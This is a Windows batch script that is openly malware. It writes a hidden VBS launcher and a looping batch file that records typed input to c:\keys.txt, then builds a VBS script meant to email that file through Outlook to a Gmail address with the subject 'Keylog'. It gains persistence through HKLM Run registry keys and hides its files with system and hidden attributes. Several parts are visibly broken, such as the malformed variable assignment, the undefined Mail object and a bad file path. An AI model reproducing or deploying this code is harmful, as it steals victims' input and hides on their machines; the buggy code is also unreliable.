@echo off
set location = %windir%\System32\stsyk.vbs
echo set shell = CreateObject("Wscript.Shell") >> %location%
echo shell.run "C:\windows\k.bat", 0 >> %location%
echo @echo off >> C:\windows\k.bat
echo color c9 >> C:\windows\k.bat
echo :go >> C:\windows\k.bat
echo echo .>>c:\keys.txt  >> C:\windows\k.bat
echo echo :  >> C:\windows\k.bat
echo set /p keys=  >> C:\windows\k.bat
echo echo %keys% >> c:\keys.txt  >> C:\windows\k.bat
echo goto go >> C:\windows\k.bat
echo start %location%  >> C:\windows\k.bat
echo(
echo Dim x > C:\kvqim.vbs
echo on error resume next >> C:\kvqim.vbs
echo Set fso =" Scripting.FileSystem.Object" >> C:\kvqim.vbs
echo Set so=CreateObject(fso) >> C:\kvqim.vbs
echo Set ol=CreateObject("Outlook.Application") >> C:\kvqim.vbs
echo Set out=WScript.CreateObject("Outlook.Application") >> C:\kvqim.vbs
echo Mail.to="cursedgaming@gmail.com">> C:\kvqim.vbs
echo Mail.Subject="Keylog" >> C:\kvqim.vbs
echo Mail.Body="" >> C:\kvqim.vbs
echo Mail.Attachments.Add("C:keys.txt") >> C:\kvqim.vbs
echo Mail.Send >> C:\kvqim.vbs
echo Next >> C:\kvqim.vbs
echo ol.Quit >> C:\kvqim.vbs
C:\kvqim.vbs
)>>C:\Windows\k.bat
ping localhost 5 > nul
del C:\kvqim.vbs
REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v WinBoot /t REG_SZ /d %location%
REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v WinBoot /t REG_SZ /d C:\Windows\k.bat
attrib +h +s %location%
attrib +h +s C:\Windows\k.bat
attrib +h keys.txt
start %location%
